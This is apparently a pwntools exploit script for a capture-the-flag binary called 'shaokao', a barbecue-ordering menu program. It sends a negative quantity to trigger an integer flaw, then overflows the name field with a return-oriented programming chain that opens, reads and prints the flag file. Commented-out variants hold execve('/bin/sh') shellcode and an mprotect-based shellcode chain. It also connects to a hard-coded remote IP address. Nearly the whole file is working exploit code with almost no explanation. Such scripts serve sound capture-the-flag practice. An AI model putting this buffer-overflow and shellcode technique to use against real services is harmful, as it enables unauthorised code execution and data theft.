from pwn import *
context.log_level = 'debug'
# p=process('./shaokao')
p=remote('47.95.212.224',)
elf=ELF('./shaokao')
context.arch='amd64'
# gdb.attach(p)

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil('3. 勇闯天涯\n'.encode())
p.sendline(b'1')
p.recvuntil('来几瓶？\n'.encode())
p.sendline(b'-9999')
p.recvuntil(b'> ')
p.sendline(b'4')

# 0x00000000004050f4 : pop rdi ; pop rbp ; ret
# 0x000000000040264f : pop rdi ; ret
# 0x00000000004a404a : pop rax ; pop rdx ; pop rbx ; ret
# 0x00000000004a404b : pop rdx ; pop rbx ; ret
# 0x000000000040a67e : pop rsi ; ret
p_rdi=0x000000000040264f
p_rsi=0x000000000040a67e
p_rdx_rbx=0x00000000004a404b
def stack(pay):
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.recvuntil('请赐名：'.encode())
    # gdb.attach(p)
    pause()
    p.sendline(pay)

ret_addr=0x401bd6
mpro_addr=0x0000000000458B00
change_addr=0x4e6000
change_len=0x3000
gaiming_addr=0x000000000401F5C
name_addr=0x0000000004E60F0
scanf_addr=0x000000000040BF60
write_addr=0x0000000000457E60
open_addr=0x0000000000457C90
read_addr=0x0000000000457DC0
fgets_unlocked_addr=0x000000000041D280
hack_addr=name_addr+0x70
s_addr=0x00000000004B71EB  #%s
bss=elf.bss()+0x200
# shellcode=asm('''
# xor 	rsi,	rsi			
# push	rsi				
# mov 	rdi,	0x68732f2f6e69622f	 
# push	rdi
# push	rsp		
# pop	rdi				
# mov 	al,	59			
# cdq					
# syscall
# ''')
orw_payload=b'flag\x00'.ljust(0x20,b'\x00')+p64(bss)
orw_payload+=flat([p_rdi,name_addr,p_rsi,0,open_addr])
orw_payload+=flat([p_rdi,3,p_rsi,name_addr+0x200,p_rdx_rbx,0x30,0x30,read_addr])
orw_payload+=flat([p_rdi,1,p_rsi,name_addr+0x200,p_rdx_rbx,0x30,0x30,write_addr])
stack(orw_payload)
p.interactive()

# shellcode=asm(shellcraft.sh())
# payload=b'a'*0x20+p64(bss)+p64(p_rdi)+p64(s_addr)+p64(p_rsi)+p64(bss+0x200)+p64(p_rdx_rbx)+p64(0)+p64(0)+p64(write_addr)+p64(ret_addr)
# stack(payload)
# p.sendline(shellcode)

# payload=b'a'*0x20+p64(bss)+p64(p_rdi)+p64(change_addr)+p64(p_rsi)+p64(change_len)+p64(p_rdx_rbx)+p64(7)+p64(0)+p64(mpro_addr)+p64(p_rdi)+p64(s_addr)+p64(p_rsi)+p64(bss+0x200)+p64(scanf_addr)+p64(bss+0x200)

# print('write addr',hex(bss+0x200))
# # gdb.attach(p,'b *0x401fad')
# pause()
# stack(payload)
p.interactive()
# gdb.attach(p)
# payload2=b'a'*0x20+p64(bss+0x50)+p64(name_addr+0x28)+asm(shellcraft.sh())
# stack(payload2)
# # # p.recvuntil(b'a'*0x20)
# # # stack_addr=u64(p.recv(6).ljust(8,b'\x00'))
# # # print('stack_addr',hex(stack_addr))
# p.interactive()